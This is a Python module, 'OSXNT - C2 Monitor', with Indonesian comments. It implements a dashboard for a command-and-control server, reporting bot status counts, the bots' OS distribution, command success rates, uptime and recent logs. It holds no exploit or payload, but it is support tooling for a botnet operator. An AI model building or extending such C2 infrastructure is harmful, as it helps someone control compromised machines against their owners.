#!/usr/bin/env python3
# OSXNT - C2 Monitor
# Monitoring system untuk bot status

import time
from datetime import datetime

class C2Monitor:
    """
    Monitor untuk tracking bot status dan aktivitas
    """
    
    def __init__(self, server):
        """
        Inisialisasi monitor
        
        Args:
            server: C2Server instance
        """
        self.server = server
        self.stats = {
            'commands_sent': 0,
            'commands_success': 0,
            'commands_failed': 0,
            'data_received': 0,
            'errors': []
        }
        
        self.start_time = time.time()
    
    def update_stats(self, stat_name, value=1):
        """
        Update statistic
        
        Args:
            stat_name: nama stat
            value: nilai (default 1)
        """
        if stat_name in self.stats:
            self.stats[stat_name] += value
        else:
            self.stats[stat_name] = value
    
    def get_bot_status_summary(self):
        """
        Get summary of bot statuses
        """
        total = len(self.server.bots)
        active = sum(1 for b in self.server.bots.values() 
                    if b.get('status') == 'active')
        inactive = sum(1 for b in self.server.bots.values() 
                      if b.get('status') == 'inactive')
        disconnected = sum(1 for b in self.server.bots.values() 
                          if b.get('status') == 'disconnected')
        
        return {
            'total': total,
            'active': active,
            'inactive': inactive,
            'disconnected': disconnected
        }
    
    def get_bot_os_stats(self):
        """
        Get OS statistics from bots
        """
        os_stats = {}
        for bot in self.server.bots.values():
            os_name = bot.get('os', 'unknown')
            os_stats[os_name] = os_stats.get(os_name, 0) + 1
        return os_stats
    
    def get_performance_stats(self):
        """
        Get performance statistics
        """
        uptime = time.time() - self.start_time
        
        # Hitung rata-rata
        avg_success = 0
        if self.stats['commands_sent'] > 0:
            avg_success = (self.stats['commands_success'] / 
                          self.stats['commands_sent']) * 100
        
        return {
            'uptime': uptime,
            'uptime_str': self._format_uptime(uptime),
            'commands_sent': self.stats['commands_sent'],
            'commands_success': self.stats['commands_success'],
            'commands_failed': self.stats['commands_failed'],
            'success_rate': avg_success,
            'errors_count': len(self.stats['errors'])
        }
    
    def _format_uptime(self, seconds):
        """
        Format uptime to readable string
        """
        days = int(seconds // 86400)
        hours = int((seconds % 86400) // 3600)
        minutes = int((seconds % 3600) // 60)
        secs = int(seconds % 60)
        
        parts = []
        if days > 0:
            parts.append(f"{days}d")
        if hours > 0:
            parts.append(f"{hours}h")
        if minutes > 0:
            parts.append(f"{minutes}m")
        parts.append(f"{secs}s")
        
        return ' '.join(parts)
    
    def get_recent_logs(self, limit=10):
        """
        Get recent logs
        
        Args:
            limit: jumlah log yang diambil
        """
        return self.server.logs[-limit:] if self.server.logs else []
    
    def show_dashboard(self):
        """
        Display monitoring dashboard
        """
        bot_stats = self.get_bot_status_summary()
        os_stats = self.get_bot_os_stats()
        perf_stats = self.get_performance_stats()
        
        print("\n📊 MONITORING DASHBOARD")
        print("=" * 60)
        
        # Server Info
        print(f"🖥️  SERVER INFO")
        print(f"   IP: {self.server.ip}:{self.server.port}")
        print(f"   Uptime: {perf_stats['uptime_str']}")
        print(f"   Tools Loaded: {len(self.server.tools)}")
        print()
        
        # Bot Statistics
        print(f"🤖 BOT STATISTICS")
        print(f"   Total Bots    : {bot_stats['total']}")
        print(f"   🟢 Active      : {bot_stats['active']}")
        print(f"   🔴 Inactive    : {bot_stats['inactive']}")
        print(f"   ⚫ Disconnected : {bot_stats['disconnected']}")
        print()
        
        # OS Distribution
        if os_stats:
            print(f"💻 OS DISTRIBUTION")
            for os_name, count in os_stats.items():
                percentage = (count / bot_stats['total']) * 100 if bot_stats['total'] > 0 else 0
                bar = '█' * int(percentage / 5)
                print(f"   {os_name:<15} : {bar} {count} ({percentage:.1f}%)")
            print()
        
        # Performance
        print(f"⚡ PERFORMANCE")
        print(f"   Commands Sent    : {perf_stats['commands_sent']}")
        print(f"   ✅ Success        : {perf_stats['commands_success']}")
        print(f"   ❌ Failed         : {perf_stats['commands_failed']}")
        print(f"   📊 Success Rate   : {perf_stats['success_rate']:.1f}%")
        print(f"   ⚠️  Errors         : {perf_stats['errors_count']}")
        print()
        
        # Recent Logs
        logs = self.get_recent_logs(5)
        if logs:
            print(f"📝 RECENT LOGS")
            for log in logs:
                timestamp = log.get('timestamp', '')[-8:] if log.get('timestamp') else ''
                level = log.get('level', 'info')
                message = log.get('message', '')
                
                level_icon = {
                    'info': 'ℹ️',
                    'warning': '⚠️',
                    'error': '❌',
                    'debug': '🔍'
                }.get(level, '📌')
                
                print(f"   {level_icon} [{timestamp}] {message}")
        
        print("=" * 60)
